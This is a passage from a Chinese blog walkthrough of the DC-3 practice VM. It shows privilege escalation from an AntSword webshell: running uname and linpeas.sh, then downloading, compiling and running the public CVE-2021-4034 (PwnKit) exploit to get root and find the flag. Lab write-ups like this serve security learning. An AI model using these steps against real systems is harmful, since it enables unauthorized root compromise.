+<p>有sudo，除此之外也没其它可以用的命令了。</p>
+<p>我们再试试sudo -l：</p>
+<a href="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130212118307.png" class="gallery-item" style="box-shadow: none;"> <img src="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130212118307.png" class="" title="image-20241130212118307"></a>
+
+<p>好吧，也是不行。</p>
+</li>
+<li><p>这个时候我们使用回溯记忆大法，想想之前有没有其它的线索提醒我们：</p>
+<p><strong>回到最初的网页提示，它说只有一个方法，而且，取决于你自己和system</strong></p>
+<p>我们是知道系统的版本的，在nmap扫描的时候：</p>
+<p>系统版本：Linux 3.2-4.9</p>
+<p>现在都得到webshell了，我们使用命令查看准确的系统版本号：</p>
+<p>使用命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a  #查看当前系统的所有版本信息</span><br></pre></td></tr></table></figure>
+
+<a href="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130212528732.png" class="gallery-item" style="box-shadow: none;"> <img src="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130212528732.png" class="" title="image-20241130212528732"></a>
+
+<p>得到是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux 4.4.0-21-generic #37-Ubuntu</span><br></pre></td></tr></table></figure>
+
+<p>好吧，居然都知道具体的版本信息了，而且靶机也提示我们从这里入手，那就查找历史漏洞吧。</p>
+</li>
+<li><p>上传linux内核漏洞检测脚本文件Linpeas.sh：</p>
+<p>这里使用的是Linpeas，全自动脚本文件，启动简单。</p>
+<blockquote>
+<p><strong>Linpeas</strong> 是一款用于 Linux 系统的权限提升和系统枚举工具.:</p>
+<ul>
+<li><strong>信息收集全面</strong>：能够收集大量的系统信息，包括当前用户和系统信息、运行的进程和服务、已安装的软件包列表、内核及相关信息、文件系统信息、网络信息、安全配置信息等，为评估系统安全状况和寻找提权路径提供丰富的数据支持.</li>
+<li><strong>提权路径检测</strong>：自动搜索可能的本地权限提升路径，并以清晰、易读的格式输出结果，帮助安全研究人员和渗透测试人员快速识别系统中的错误配置、潜在漏洞以及可利用的提权机会，从而更高效地进行权限提升操作</li>
+<li><strong>输出格式友好</strong>：以彩色和结构化的文本形式展示信息和结果，使输出更具可读性，便于用户快速定位和理解关键信息，能够突出显示可能存在风险或可利用的部分，让使用者可以更直观地关注到重点内容 。</li>
+</ul>
+<p><strong>使用方法</strong>：</p>
+<ol>
+<li><p><strong>下载</strong>：可以通过 <code>git clone https://github.com/carlospolop/PEASS-ng.git</code> 命令克隆其在 GitHub 上的仓库来获取 linpeas</p>
+</li>
+<li><p>也可以使用</p>
+<p><code>wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh</code> 直接下载脚本文件</p>
+</li>
+<li><p><strong>设置权限</strong>：下载完成后，需要使用 <code>chmod +x linpeas.sh</code> 命令赋予脚本可执行权限</p>
+</li>
+<li><p><strong>运行脚本</strong>：执行 <code>./linpeas.sh</code> 即可开始对系统进行信息收集和提权路径检测 。还可以使用 <code>linpeas.sh -a &gt; output.txt</code> 将输出结果保存到指定的文件中以便后续查看和分析</p>
+</li>
+</ol>
+</blockquote>
+<p>可以从靶机直接wget下载，也可以在本地下载后通过蚁剑上传到靶机</p>
+<p>这里我的靶机一直下载不下来，那就下载到kali后直接通过蚁剑上传吧：</p>
+<a href="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130230506065.png" class="gallery-item" style="box-shadow: none;"> <img src="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130230506065.png" class="" title="image-20241130230506065"></a>
+
+<a href="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130230651982.png" class="gallery-item" style="box-shadow: none;"> <img src="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130230651982.png" class="" title="image-20241130230651982"></a>
+
+<p>上传成功之后需要赋予linpeas.sh权限：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x linpeas.sh  #赋予执行权限</span><br><span class="line">./linpeas.sh  #运行脚本</span><br></pre></td></tr></table></figure>
+
+<a href="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130230817343.png" class="gallery-item" style="box-shadow: none;"> <img src="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130230817343.png" class="" title="image-20241130230817343"></a>
+
+<a href="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130231356754.png" class="gallery-item" style="box-shadow: none;"> <img src="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130231356754.png" class="" title="image-20241130231356754"></a>
+
+<p>梭哈出了一大堆内核漏洞，具体用哪个的话看你喜好了。</p>
+<p>这里我使用最后一个的2021年漏洞，比较新。</p>
+<p>下载地址：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://codeload.github.com/berdav/CVE-2021-4034/zip/main">https://codeload.github.com/berdav/CVE-2021-4034/zip/main</a></p>
+</blockquote>
+<p>下载后解压，点开readme，查看使用方法：</p>
+<a href="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130232023939.png" class="gallery-item" style="box-shadow: none;"> <img src="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130232023939.png" class="" title="image-20241130232023939"></a>
+
+<p>ok，只需要make后再.&#x2F;cve-2021-4034就可以了。</p>
+</li>
+<li><p>上传提权文件</p>
+<p>一样的道理，可以通过蚁剑，也可以用wget下载。</p>
+<p>我还是用蚁剑：</p>
+<a href="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130232302976.png" class="gallery-item" style="box-shadow: none;"> <img src="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130232302976.png" class="" title="image-20241130232302976"></a>
+
+<p>先解压缩：</p>
+<a href="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130232433600.png" class="gallery-item" style="box-shadow: none;"> <img src="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130232433600.png" class="" title="image-20241130232433600"></a>
+
+<p>按照教程来，先运行make命令：</p>
+<a href="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130232622770.png" class="gallery-item" style="box-shadow: none;"> <img src="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130232622770.png" class="" title="image-20241130232622770"></a>
+
+<p>成功编译运行，再运行.&#x2F;cve-2021-4034</p>
+<a href="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130232850255.png" class="gallery-item" style="box-shadow: none;"> <img src="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130232850255.png" class="" title="image-20241130232850255"></a>
+
+<p><strong>成功提权</strong></p>
+<p>赶紧找找flag吧。</p>
+<p>使用命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name &quot;*flag*.txt&quot; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<a href="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130234048470.png" class="gallery-item" style="box-shadow: none;"> <img src="/2024/11/30/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20241130234048470.png" class="" title="image-20241130234048470"></a>
+
+<p>找到在&#x2F;root&#x2F;the-flag.txt。直接cat吧。</p>
+</li>
+</ol>
+</div>
+    </div>
+
+    <div class="post-meta">
+        <i>
+        
+            <span>2024-11-30</span>
+            
+                <span>该篇文章被 Leng-CS</span>
+            
+            
+                <span>打上标签:
+                    
+                    
+                        <a href='/tags/%E9%9D%B6%E6%9C%BA%E8%AE%B2%E8%A7%A3/'>
+                            靶机讲解
+                        </a>
+                    
+                </span>
+             
+             
+        
+        </i>
+    </div>
+    <br>
+    
+    
+        
+            
+    
+            <div class="post-footer-pre-next">
+                
+
+                
+                    <span class="post-footer-pre-next-last-span-right">下一篇：<a href="/2024/11/27/DC-2%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">DC-2靶机渗透测试（wpscan、cewl、rbash逃逸、git提权）</a>
+                    </span>
+                
+            </div>
+    
+        
+    
+
+    
+        
+
+     
+</div>
+
+
+
+                                      
+                    
+                    
+                    <div class="footer">
+    
+        <span> 
+            © 2004-2024 China 
+
+            
+                
+
+            
+        </span>
+       
+    
+</div>
+
+
+
+<!--这是指一条线往下的内容-->
+<div class="footer-last">
+    
+            <span>🌊🌊</span>
+            
+    
+</div>
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>
+
+    <!--目录-->
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.tocify/1.9.0/javascripts/jquery.tocify.min.js" type="text/javascript" ></script>
+        
+<script src="/js/toc.js"></script>
+
+    
+
+    
+<script src="/js/randomHeaderContent.js"></script>
+
+    <!--回到顶部按钮-->
+    
+        
+<script src="/js/returnToTop.js"></script>
+
+    
+
+    
+        
+<script src="/js/returnToLastPage.js"></script>
+
+    
+
+
+
+
+
+<script src="/js/lightgallery/lightgallery.umd.min.js"></script>
+
+
+
+<script src="/js/lightgallery/plugins/lg-thumbnail.umd.min.js"></script>
+
+
+
+<script src="/js/lightgallery/plugins/lg-fullscreen.umd.min.js"></script>
+
+
+<script src="/js/lightgallery/plugins/lg-autoplay.umd.min.js"></script>
+
+
+<script src="/js/lightgallery/plugins/lg-zoom.umd.min.js"></script>
+
+
+<script src="/js/lightgallery/plugins/lg-rotate.umd.min.js"></script>
+
+
+<script src="/js/lightgallery/plugins/lg-paper.umd.min.js"></script>
+
+
+
+
+<script type="text/javascript">
+     
+    if (typeof lightGallery !== "undefined") {
+        var options1 = {
+            selector: '.gallery-item',
+            plugins: [lgThumbnail, lgFullscreen, lgAutoplay, lgZoom, lgRotate, lgPager], // 启用插件
+            thumbnail: true,          // 显示缩略图
+            zoom: true,               // 启用缩放功
+            rotate: true,             // 启用旋转功能能
+            autoplay: true,        // 启用自动播放功能
+            fullScreen: true,      // 启用全屏功能
+            pager: false, //页码,
+            zoomFromOrigin: true,   // 从原始位置缩放
+            actualSize: true,       // 启用查看实际大小的功能
+            enableZoomAfter: 300,    // 延迟缩放，确保图片加载完成后可缩放
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options1); // 修复选择器
+    }
+    
+</script>
+
+
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script> 
+
+                </div>
+            
+            
+                <!-- 回到顶部的按钮-->  
+                <div class="progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+            
+                <!-- 返回的按钮-->  
+                <div class="return-to-last-progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+    </body>
+</html>
